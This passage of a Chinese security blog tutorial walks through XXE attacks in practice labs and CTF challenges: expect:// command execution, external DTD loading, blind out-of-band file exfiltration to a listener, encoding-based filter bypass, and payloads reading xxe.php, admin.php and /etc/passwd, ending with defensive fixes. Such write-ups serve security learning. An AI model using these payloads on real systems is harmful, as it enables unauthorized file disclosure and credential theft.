src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image8.png" alt="image8"></p><h3 id="5-玩法3——RCE"><a href="#5-玩法3——RCE" class="headerlink" title="5.玩法3——RCE"></a>5.玩法3——RCE</h3><p>该CASE是在安装expect扩展的PHP环境里执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于本地环境未安装expect扩展，因此该玩法未测试。</p><h3 id="6-玩法4——引入外部实体dtd"><a href="#6-玩法4——引入外部实体dtd" class="headerlink" title="6.玩法4——引入外部实体dtd"></a>6.玩法4——引入外部实体dtd</h3><p>访问本地的evil2.dtd文件（这个是XML的格式文件，访问该文件就会以XML格式执行）</p><p>在evil2.dtd文件中，写入XML的伪协议代码：访问本地c盘的1.txt文件</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image9.png" alt="image9"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:10086/evil2.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">//引入外部实体dtd，dtd就是xml的后缀，识别为xml格式</span><br><span class="line">//如果设置了禁止外部实体引用，将会失效</span><br></pre></td></tr></table></figure><p><strong>显示结果：</strong></p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image10.png" alt="image10"></p><p>引入外部实体dtd，核心代码在drd文件中，一方面是为了绕过一些服务器的限制，另一方面是为了自定义一些攻击代码，类似于远程文件包含漏洞。如下图，成功回显服务器上文件内容。</p><h3 id="7-玩法5——无回显——读取文件"><a href="#7-玩法5——无回显——读取文件" class="headerlink" title="7.玩法5——无回显——读取文件"></a>7.玩法5——无回显——读取文件</h3><p><strong>大致步骤：</strong></p><ol><li><p>第一步：读取test.txt文件的内容（端口根目录），然后base64加密赋值给变量file</p></li><li><p>第二步：访问自己本地的test.dtd文件（貌似这里也可以说内网的其它电脑，我猜测是本地，应为要自己伪造test.dtd文件才行），以XML格式执行本地的test.dtd文件</p></li><li><p>第三步：将本地test.txt文件的加密内容赋值给data变量。然后再通过日志的读取或者文件的接受变量来获取靶场的1.txt的文件的内容</p></li></ol><p>首先pikachu注释掉回显代码，构造无回显的环境</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image11.png" alt="image11"></p><p>如下脚本：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=c://1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:10086/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>本地服务器192.168.176.128上构造test.dtd：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://127.0.0.1:10086/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><p>此时把脚本复制粘贴，提交，服务器不再返回任何信息</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image12.png" alt="image12"></p><p>本地开启日志，查找日志就可以看到test.txt数据了。</p><p>查看日志，没有发现BASE64加密的数据（<strong>这里问题没弄懂</strong>）</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image13.png" alt="image13"></p><h3 id="8-玩法6——协议——读文件（绕过）"><a href="#8-玩法6——协议——读文件（绕过）" class="headerlink" title="8.玩法6——协议——读文件（绕过）"></a>8.玩法6——协议——读文件（绕过）</h3><ul><li>ENTITY、SYSTEM、file等关键词被过滤–&gt;使用编码方式绕过：UTF-16BE</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</span><br></pre></td></tr></table></figure><ul><li>http被过滤–&gt;可以使用其他协议绕过，比如data://协议、file://协议加文件上传、php://filter协议加文件上传</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [ <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-如何判断是什么过滤？"><a href="#9-如何判断是什么过滤？" class="headerlink" title="9.如何判断是什么过滤？"></a>9.如何判断是什么过滤？</h3><p>构造各种payload进行尝试（网上有字典，构造脚本去跑就行）</p><h2 id="三-xxe-lab靶场登陆框——xml数据传输测试——检测发现"><a href="#三-xxe-lab靶场登陆框——xml数据传输测试——检测发现" class="headerlink" title="三.xxe-lab靶场登陆框——xml数据传输测试——检测发现"></a>三.xxe-lab靶场登陆框——xml数据传输测试——检测发现</h2><p>靶场下载地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p><h3 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image14.png" alt="image14"></p><p>爬虫分析</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image15.png" alt="image15"></p><p>在请求数据包里面搜索关键字XML（发现一个）</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image16.png" alt="image16"></p><p>发现post传输的数据为xml格式</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image17.png" alt="image17"></p><h3 id="2-结合post传输构造payload语句"><a href="#2-结合post传输构造payload语句" class="headerlink" title="2.结合post传输构造payload语句"></a>2.结合post传输构造payload语句</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Mikasa</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image18.png" alt="image18"></p><h2 id="四-CTF-Vulnhub-XXE-安全真题复现-检测-利用-拓展-实战"><a href="#四-CTF-Vulnhub-XXE-安全真题复现-检测-利用-拓展-实战" class="headerlink" title="四.CTF-Vulnhub-XXE 安全真题复现-检测,利用,拓展,实战"></a>四.CTF-Vulnhub-XXE 安全真题复现-检测,利用,拓展,实战</h2><p>靶场下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p><p>下载解压后会有如下文件</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image19.png" alt="image19"></p><p>删除mf文件然后用VMware打开ovf文件，导入到一个新的文件夹中，虚拟机导入成功！</p><h3 id="1-进入靶场-1"><a href="#1-进入靶场-1" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image20.png" alt="image20"></p><h3 id="2-对同网段的相似ip进行扫描"><a href="#2-对同网段的相似ip进行扫描" class="headerlink" title="2.对同网段的相似ip进行扫描"></a>2.对同网段的相似ip进行扫描</h3><p>已经知道虚拟机的ip网段是192.168.176.0</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image21.png" alt="image21"></p><p>使用nmap对该网段的所有ip扫描</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image22.png" alt="image22"></p><p>浏览器访问</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image23.png" alt="image23"></p><p>由于这是一个web网站，我们可以尝试扫描web目录，或者直接查看robots.txt找到关键目录</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image24.png" alt="image24"></p><p>进入/xxe/目录，发现是个登录框</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image25.png" alt="image25"></p><p>尝试抓包查看，发现登录参数采用xml格式传输，猜测这里有xxe漏洞</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image26.png" alt="image26"></p><p>尝试攻击一下，利用以下脚本读取xxe.php源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功回显</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image27.png" alt="image27"></p><p><strong>注意：</strong>这里为什么使用php://filter协议而不是使用file://协议呢？原因是php://filter协议读取文件时，不需要文件的绝对地址，而file://协议需要文件的绝对地址。</p><p>将xxe.php改为admin.php，成功读取admin.php源码</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image28.png" alt="image28"></p><p>base64解码源代码后，分析，成功找到用户名密码</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image29.png" alt="image29"></p><p>密码是md5散列后的值，将其解密后得到原始密码为admin@123，使用用户名密码登录网站。</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image30.png" alt="image30"></p><p>登录成功后，显示如下页面，点击flag。</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image31.png" alt="image31"></p><p>点击flag后，跳转到flagmeout.php页面，但是显示无法打开该页面</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image32.png" alt="image32"></p><p>再次尝试读取flagmeout.php页面源代码（这里由于flagmeout.php文件在根目录下，而不是在/xxe/目录下，因此读取时需要写为./flagmeout.php）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=./flagmeout.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功回显</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image33.png" alt="image33"></p><p>base64解码源代码，找到加密后的flag</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image34.png" alt="image34"></p><p>分析flag，发现是base32编码，将其在线解码，得到字符串如下</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image35.png" alt="image35"></p><p>该字符串是base64编码，再将其base64解码，成功得到flag地址：/etc/.flag.php</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image36.png" alt="image36"></p><p>继续使用脚本读取该文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/.flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image37.png" alt="image37"></p><p>base64解码如下，分析，这是一段php代码</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image38.png" alt="image38"></p><p>将这段PHP代码在线运行一下，成功得到flag</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image39.png" alt="image39"></p><h2 id="五-CTF-Jarvis-OJ-Web-XXE安全真题复现-数据请求格式"><a href="#五-CTF-Jarvis-OJ-Web-XXE安全真题复现-数据请求格式" class="headerlink" title="五.CTF-Jarvis-OJ-Web-XXE安全真题复现-数据请求格式"></a>五.<strong>CTF-Jarvis-OJ-Web-XXE安全真题复现-数据请求格式</strong></h2><p>真题地址：<a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p><p>抓包如下，数据包使用的是json格式，此处使用盲猜的方法检测是否存在xxe漏洞</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image40.png" alt="image40"></p><p>更改请求数据格式为：application/xml，使用以下脚本，成功读取服务器文件passwd内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image41.png" alt="image41"></p><h2 id="六-xxe安全漏洞自动化注射脚本工具-XXEinjector-Ruby"><a href="#六-xxe安全漏洞自动化注射脚本工具-XXEinjector-Ruby" class="headerlink" title="六.xxe安全漏洞自动化注射脚本工具-XXEinjector(Ruby)"></a>六.xxe安全漏洞自动化注射脚本工具-XXEinjector(Ruby)</h2><p>有空再看</p><p>XXEinjector是一款基于Ruby的XXE注入工具，它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。</p><p>运行前提：Ruby运行环境，建议在kali环境下运行。</p><h2 id="七-xxe-漏洞修复与防御方案-php-java-python-过滤及禁用"><a href="#七-xxe-漏洞修复与防御方案-php-java-python-过滤及禁用" class="headerlink" title="七.xxe 漏洞修复与防御方案-php,java,python-过滤及禁用"></a>七.xxe 漏洞修复与防御方案-php,java,python-过滤及禁用</h2><h3 id="1-禁用外部实体"><a href="#1-禁用外部实体" class="headerlink" title="1.禁用外部实体"></a>1.禁用外部实体</h3><p><strong>PHP:</strong></p><p>libxml_disable_entity_loader(true);</p><p><strong>JAVA:</strong></p><p>DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p><p><strong>Python：</strong></p><p>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><h3 id="2-过滤用户提交的-XML-数据"><a href="#2-过滤用户提交的-XML-数据" class="headerlink" title="2.过滤用户提交的 XML 数据"></a>2.过滤用户提交的 XML 数据</h3><p>过滤关键词：&lt;!DOCTYPE 和&lt;!ENTITY，或者 SYSTEM 和 PUBLIC（这里可以用加密绕过）</p><h3 id="3-装WAF产品"><a href="#3-装WAF产品" class="headerlink" title="3.装WAF产品"></a>3.装WAF产品</h3></div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E5%B0%8F%E7%99%BD%EF%BC%8C%E5%AD%A6%E4%B9%A0/" rel="tag"># 小白，学习</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/" rel="prev" title="反序列化之PHP-JAVA全解（下）"><i class="fa fa-chevron-left"></i> 反序列化之PHP-JAVA全解（下）</a></div><div class="post-nav-item"></div></div></footer></article></div><div class="comments" id="valine-comments"></div><script>window.addEventListener("tabs:register",()=>{let e=CONFIG.comments["activeClass"];if(CONFIG.comments.storage&&(e=localStorage.getItem("comments_active")||e),e){let t=document.querySelector(`a[href="#comment-${e}"]`);t&&t.click()}}),CONFIG.comments.storage&&window.addEventListener("tabs:click",t=>{t.target.matches(".tabs-comment .tab-content .tab-pane")&&(t=t.target.classList[1],localStorage.setItem("comments_active",t))})</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE-amp-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">XXE&amp;XML之利用检测绕过全解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-XML%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">一.XML原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-XML%E5%92%8CXXE%E5%8C%BA%E5%88%AB"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.XML和XXE区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-XML%E5%92%8CHTML%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.XML和HTML的区别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-pikachu%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94XML%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%B5%8B%E8%AF%95%EF%BC%88%E5%9B%9E%E6%98%BE%EF%BC%8C%E7%8E%A9%E6%B3%95%EF%BC%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E5%BC%95%E5%85%A5%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">二.pikachu靶场——XML数据传输测试（回显，玩法，协议，引入）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%84%9A%E6%9C%AC%E9%80%82%E7%94%A8%E7%8E%AF%E5%A2%83"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.各种协议的脚本适用环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%BF%9B%E5%85%A5%E9%9D%B6%E5%9C%BA"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.进入靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%8E%A9%E6%B3%951%E2%80%94%E2%80%94%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.玩法1——读取文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 